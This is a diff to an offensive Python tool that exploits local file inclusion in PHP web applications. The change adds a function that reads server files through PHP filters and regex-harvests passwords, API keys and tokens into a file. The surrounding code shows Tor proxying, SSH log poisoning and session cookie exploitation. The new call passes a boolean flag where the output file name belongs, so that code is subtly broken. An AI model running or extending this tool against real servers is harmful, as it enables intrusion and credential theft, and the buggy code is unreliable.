@@ -29,10 +29,9 @@ def exploit_lfi(url, param, lfi_payload, method="GET", proxies=None):
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     if method.upper() == "POST":
-        print(f"[DEBUG] Sending payload: {lfi_payload}")
-        response = requests.get(
+        response = requests.post(
             url,
-            params={param: lfi_payload},
+            data={param: lfi_payload},  # <-- THIS LINE
             verify=False,
             proxies=proxies
         )
@@ -88,6 +87,48 @@ def php_filter_base64(url, param, filename, method="GET", proxies=None):
     print("[!] Found base64 candidates but decoding failed")
     return None
 
+def detect_secrets(url, param, filename, outfile, method="GET", proxies=None):
+    print("[*] Searching for secrets...")
+
+    decoded = php_filter_base64(url, param, filename, method, proxies)
+
+    if not decoded:
+        print("[-] No decoded content to scan.")
+        return None
+
+    secrets_patterns = [
+        r"password\s*=\s*.*",
+        r"pass\s*=\s*.*",
+        r"passwd\s*=\s*.*",
+        r"secret\s*=\s*.*",
+        r"api_key\s*=\s*.*",
+        r"token\s*=\s*.*",
+        r"key\s*=\s*.*",
+        r"auth_token\s*=\s*.*",
+        r"auth_key\s*=\s*.*",
+        r"secret_key\s*=\s*.*",
+        r"secret_token\s*=\s*.*",
+        r"access_token\s*=\s*.*",
+    ]
+
+    found = []
+
+    for pattern in secrets_patterns:
+        matches = re.findall(pattern, decoded, re.IGNORECASE)
+        for match in matches:
+            print(f"[+] Found: {match}")
+            found.append(match)
+
+    if found:
+        with open(outfile, "a") as f:
+            for item in found:
+                f.write(item + "\n")
+        print(f"[+] Secrets saved to {outfile}")
+        return found
+    else:
+        print("[-] No secrets found.")
+        return None
+
 def session_exploit(url, cookie, param, lfi_payload, proxies=None):
     session = requests.Session()
     session.cookies.set("PHPSESSID", cookie)
@@ -134,6 +175,8 @@ def main():
     parser.add_argument("--tor", action="store_true", help="Use Tor to proxy the requests.")
     # Create the optional argument for php filters
     parser.add_argument("--php-filter", action="store_true", help="Use PHP filters to decode base64.")
+    parser.add_argument("--secrets", action="store_true")
+    parser.add_argument("--outfile", default="secrets.txt")
 
     args = parser.parse_args()
     
@@ -157,6 +200,9 @@ def main():
             print("[-] Could not determine target IP. Make sure you provide a valid URL.")
         
         ssh_log_poison(target_ip, use_tor=args.tor)  # Now supports Tor!
+    
+    if args.secrets:
+        detect_secrets(args.url, args.param, args.lfi_payload, args.secrets, args.method, proxies)
 
     if args.php_filter:
         result = php_filter_base64(
@@ -180,4 +226,3 @@ def main():
         
 if __name__ == "__main__":
     main()
-
